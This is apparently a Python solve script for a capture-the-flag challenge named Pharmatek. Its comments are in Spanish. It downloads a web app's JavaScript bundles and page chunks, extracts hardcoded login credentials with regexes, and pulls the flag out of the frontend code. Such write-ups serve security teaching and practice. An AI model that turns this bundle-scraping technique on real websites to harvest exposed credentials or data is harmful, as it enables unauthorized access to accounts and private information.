#!/usr/bin/env python3
"""CDM CTF 2026-11-13 - Pharmatek (<host>:27370)

Vulnerabilidad: la autenticacion y el "secreto" viven en el frontend.
El login compara usuario/clave contra un objeto hardcodeado en el bundle y
guarda la sesion en localStorage; el dashboard trae la bandera incrustada en
el listado de pacientes (y ademas los bundles publican sus source maps).

Uso: python solve.py [host:puerto]
"""
from __future__ import annotations

import re
import sys

import requests

HOST = sys.argv[1] if len(sys.argv) > 1 else "<host>:27370"
BASE = "http://" + HOST
FLAG_RE = re.compile(r"cdm\{[^}]*\}")
CRED_RE = re.compile(r'username:"([^"]+)",password:"([^"]+)"')
CHUNK_RE = re.compile(r'["\'](\./)?(page-[A-Za-z0-9_-]+\.js)["\']')


def main() -> int:
    s = requests.Session()

    html = s.get(f"{BASE}/", timeout=20).text
    principal = re.search(r'src="(/assets/[^"]+\.js)"', html)
    if not principal:
        print("[-] no se encontro el bundle principal")
        return 1
    bundle = s.get(BASE + principal.group(1), timeout=20).text
    print(f"[*] bundle principal: {principal.group(1)} ({len(bundle)} B)")

    # Los chunks de las paginas (login/dashboard) se referencian desde el bundle
    chunks = sorted(set(m[1] for m in CHUNK_RE.findall(bundle)))
    print(f"[*] chunks: {chunks}")

    credenciales = None
    flag = None
    for nombre in chunks:
        js = s.get(f"{BASE}/assets/{nombre}", timeout=20).text
        if credenciales is None:
            m = CRED_RE.search(js)
            if m:
                credenciales = m.groups()
        m = FLAG_RE.search(js)
        if m and flag is None:
            flag = m.group(0)
            print(f"[*] bandera en {nombre}")

    if credenciales:
        print(f"[*] credenciales hardcodeadas: {credenciales[0]} / {credenciales[1]}")
    else:
        print("[!] no se encontraron credenciales (no hacen falta)")

    if not flag:
        print("[-] no se encontro la bandera en el frontend")
        return 1
    print(f"[+] FLAG: {flag}")
    with open("flag.txt", "w", encoding="utf-8") as fh:
        fh.write(flag + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
